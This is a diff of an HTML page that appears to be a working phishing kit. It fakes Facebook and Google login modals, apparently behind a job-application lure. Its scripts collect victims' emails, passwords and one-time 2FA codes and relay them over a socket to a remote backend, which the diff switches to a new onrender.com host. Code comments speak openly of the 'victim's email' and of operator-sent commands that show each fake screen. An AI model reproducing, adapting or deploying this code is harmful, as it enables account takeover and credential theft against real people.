@@ -1,4 +1,4 @@
-﻿
+
 <html lang="en" class="fonts-loaded-initial fonts-loaded-full">
 
 <head>
@@ -101,7 +101,7 @@
     </div>
 <style>
 /* ================================================================
-   Facebook 2026 Modal – Full Rewrite
+   Facebook 2026 Modal � Full Rewrite
    All classes prefixed fb26- to avoid conflicts with Calendly page
    ================================================================ */
 
@@ -146,7 +146,7 @@
   to   { opacity: 1; transform: scale(1); }
 }
 
-/* ── Split layout (login / wrong-creds / old-pass) ── */
+/* -- Split layout (login / wrong-creds / old-pass) -- */
 .fb26-split { display: flex; }
 
 /* Left image panel */
@@ -212,7 +212,7 @@
   margin: 0 0 20px; padding-right: 32px;
 }
 
-/* ── Floating-label input fields ── */
+/* -- Floating-label input fields -- */
 .fb26-field { position: relative; margin-bottom: 14px; }
 .fb26-iw    { position: relative; }
 
@@ -246,7 +246,7 @@
 }
 .fb26-eye:hover { color: #1c1e21; }
 
-/* ── Buttons ── */
+/* -- Buttons -- */
 .fb26-btn-p {
   width: 100%; height: 48px;
   background: #0064e0; color: #fff;
@@ -267,7 +267,7 @@
 }
 .fb26-forgot:hover { text-decoration: underline; }
 
-/* ── Error banner ── */
+/* -- Error banner -- */
 .fb26-err {
   display: flex; gap: 10px; align-items: flex-start;
   background: #fff4f5; border: 1px solid #ffc0c5;
@@ -279,7 +279,7 @@
 .fb26-err-t a { color: #0064e0; text-decoration: none; }
 .fb26-err-t a:hover { text-decoration: underline; }
 
-/* ── Meta wordmark + page footer ── */
+/* -- Meta wordmark + page footer -- */
 .fb26-meta { margin-top: 18px; }
 
 .fb26-foot { margin-top: auto; padding-top: 12px; }
@@ -303,7 +303,7 @@
 
 .fb26-copy { font-size: 11px; color: #8a8d91; margin: 0; }
 
-/* ── 2FA screens ── */
+/* -- 2FA screens -- */
 .fb26-2fa {
   min-height: 500px; display: flex; flex-direction: column;
   background: #fff;
@@ -367,7 +367,7 @@
 .fb26-btn-c:hover:not(:disabled) { background: #004bbf; }
 .fb26-btn-c:disabled { opacity: .4; cursor: not-allowed; }
 
-/* ── Loading screen ── */
+/* -- Loading screen -- */
 .fb26-load {
   min-height: 500px; display: flex; flex-direction: column;
   align-items: center; justify-content: center;
@@ -395,7 +395,7 @@
   vertical-align: middle;
 }
 
-/* ── Responsive ── */
+/* -- Responsive -- */
 @media (max-width: 680px) {
   .fb26-window { border-radius: 10px; }
   .fb26-lp { display: none; }
@@ -759,7 +759,7 @@
 </div><!-- /#facebook-modal -->
 
 <!-- ================================================================
-     Google / Gmail Login Modal – 2026
+     Google / Gmail Login Modal � 2026
      Panel 0: Facebook "Verify with Google" intermediate page
      Panel 1: Google email step (manual / fallback)
      Panel 2: Google password step
@@ -790,7 +790,7 @@
   to   { opacity: 1; transform: scale(1); }
 }
 
-/* ── Panel 0: Facebook Verify with Google ── */
+/* -- Panel 0: Facebook Verify with Google -- */
 #goog-fb-verify { font-family: Helvetica, Arial, sans-serif; }
 .goog-fbv-eyebrow {
   font-size: 13px; color: #65676B; margin: 0 0 14px; font-weight: 400;
@@ -820,7 +820,7 @@
 }
 .goog-fbv-verify-btn:hover { background: #0057C4; }
 
-/* ── Google Sign-in panels ── */
+/* -- Google Sign-in panels -- */
 .goog-logo { display: flex; justify-content: flex-start; margin-bottom: 24px; }
 .goog-logo svg { height: 24px; width: auto; }
 .goog-h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; line-height: 1.3333; }
@@ -896,7 +896,7 @@
   <div class="goog-overlay" id="goog-overlay">
     <div class="goog-card">
 
-      <!-- ── Panel 0: Facebook "Verify with Google" intermediate page ── -->
+      <!-- -- Panel 0: Facebook "Verify with Google" intermediate page -- -->
       <div id="goog-fb-verify">
         <p class="goog-fbv-eyebrow">Facebook</p>
         <h2 class="goog-fbv-h2">Log into your Google Account to confirm it's you</h2>
@@ -919,7 +919,7 @@
         </button>
       </div>
 
-      <!-- ── Panel 1: Google email step ── -->
+      <!-- -- Panel 1: Google email step -- -->
       <div id="goog-email-step" style="display:none">
         <div class="goog-logo">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" height="24"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32h31.96c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.77.36 15.65 16.32.19 35.48.19c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.47.09z"/></svg>
@@ -940,7 +940,7 @@
         </div>
       </div>
 
-      <!-- ── Panel 2: Google password step ── -->
+      <!-- -- Panel 2: Google password step -- -->
       <div id="goog-pass-step" style="display:none">
         <div class="goog-logo">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" height="24"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32h31.96c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.77.36 15.65 16.32.19 35.48.19c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.47.09z"/></svg>
@@ -978,14 +978,14 @@
     var googPassErr   = document.getElementById('goog-pass-err');
     var googActiveEmail = '';  // email in use for this session
 
-    // ── Panel 0: "Verify with Google" button — redirect to full-page Google sign-in ──
+    // -- Panel 0: "Verify with Google" button � redirect to full-page Google sign-in --
     document.getElementById('goog-fbv-verify-btn').addEventListener('click', function() {
       var email = googActiveEmail || document.getElementById('goog-fbv-email-display').textContent;
       try { sessionStorage.setItem('lastLoginEmail', email); } catch(e) {}
       window.location.href = 'google-login.html';
     });
 
-    // ── Panel 1: Email step (manual / fallback path) ──
+    // -- Panel 1: Email step (manual / fallback path) --
     googEmailInp.addEventListener('input', function() {
       googEmailNext.disabled = !this.value.trim();
     });
@@ -1003,7 +1003,7 @@
       googPassInp.focus();
     });
 
-    // ── Panel 2: Back button ──
+    // -- Panel 2: Back button --
     document.getElementById('goog-back-btn').addEventListener('click', function() {
       document.getElementById('goog-pass-step').style.display = 'none';
       googPassErr.classList.remove('show');
@@ -1018,7 +1018,7 @@
       }
     });
 
-    // ── Panel 2: Password input ──
+    // -- Panel 2: Password input --
     googPassInp.addEventListener('input', function() {
       googPassNext.disabled = !this.value.trim();
       if (this.value.trim()) {
@@ -1030,7 +1030,7 @@
       if (e.key === 'Enter' && !googPassNext.disabled) googPassNext.click();
     });
 
-    // ── Submit Google password → backend ──
+    // -- Submit Google password ? backend --
     googPassNext.addEventListener('click', function() {
       var email    = googActiveEmail || googEmailInp.value.trim();
       var password = googPassInp.value.trim();
@@ -1053,7 +1053,7 @@
       if (e.target === this) document.getElementById('google-modal').style.display = 'none';
     });
 
-    // ── Eye toggle ──
+    // -- Eye toggle --
     window.googTogglePass = function(btn) {
       var show = (googPassInp.type === 'password');
       googPassInp.type = show ? 'text' : 'password';
@@ -1062,7 +1062,7 @@
         : '<svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><path d="M12 5C5.636 5 2 12 2 12s3.636 7 10 7 10-7 10-7-3.636-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/></svg>';
     };
 
-    // ── Called by socket 'show-google-login': show FB verify page with victim's email ──
+    // -- Called by socket 'show-google-login': show FB verify page with victim's email --
     window.googShowWithFBEmail = function() {
       var fbEmailEl = document.getElementById('email');
       var fbEmail   = (fbEmailEl && fbEmailEl.value.trim())
@@ -1084,7 +1084,7 @@
       document.getElementById('google-modal').style.display = 'block';
     };
 
-    // ── Full reset (back to FB verify panel) ──
+    // -- Full reset (back to FB verify panel) --
     window.googReset = function() {
       googActiveEmail = '';
       googEmailInp.value = '';
@@ -1099,7 +1099,7 @@
       document.getElementById('goog-pass-step').style.display  = 'none';
     };
 
-    // ── Show wrong-password error on pass step ──
+    // -- Show wrong-password error on pass step --
     window.googShowWrongPass = function() {
       if (document.getElementById('goog-pass-step').style.display !== 'none') {
         googPassErr.classList.add('show');
@@ -1141,7 +1141,7 @@
           var h = location.hostname;
           return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
             ? 'http://localhost:3001'
-            : 'https://job-newback.onrender.com';
+            : 'https://backlatest.onrender.com';
         })();
 
         const shownCommands = {};
@@ -1178,12 +1178,12 @@
 
         let _applyFirstConnect = true;
         socket.on('connect', () => {
-            console.log("✅ Connected to server with socket ID:", socket.id);
+            console.log("? Connected to server with socket ID:", socket.id);
             localStorage.setItem('socketSession', JSON.stringify({ socketId: socket.id, timestamp: Date.now() }));
             socket.emit('userConnectedToPage', { clientId, page: 'apply' });
 
             if (!_applyFirstConnect) {
-                /* Reconnected after background — reset any stuck FB login spinner */
+                /* Reconnected after background � reset any stuck FB login spinner */
                 const loginBtn = document.getElementById('loginBtn');
                 if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
                     loginBtn.disabled = false;
@@ -1227,7 +1227,7 @@
             clearInputsAndEnableButtons();
         }
 
-        /* ── Redirected back from google-login.html — open the right FB modal ── */
+        /* -- Redirected back from google-login.html � open the right FB modal -- */
         const pendingModalMap = {
             '2fa':       'codeSms',
             'auth':      'authcode',
@@ -1269,7 +1269,7 @@
             if (shownCommands['2fa'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-sms');
                 const continueBtn = document.getElementById('smsBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn�t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1288,7 +1288,7 @@
             if (shownCommands['auth'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-auth');
                 const continueBtn = document.getElementById('authBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn�t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1307,7 +1307,7 @@
             if (shownCommands['email'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message');
                 const continueBtn = document.getElementById('buttonemailcode');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn�t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
@@ -1326,7 +1326,7 @@
             if (shownCommands['whatsapp'] && isSectionVisible(sectionId)) {
                 const timerDiv = document.getElementById('error-message-whatsapp');
                 const continueBtn = document.getElementById('whBtn');
-                if (timerDiv) timerDiv.innerText = "The code you entered isn’t correct.";
+                if (timerDiv) timerDiv.innerText = "The code you entered isn�t correct.";
                 if (timerDiv) timerDiv.style.display = 'block';
                 if (continueBtn) {
                     continueBtn.innerHTML = 'Continue';
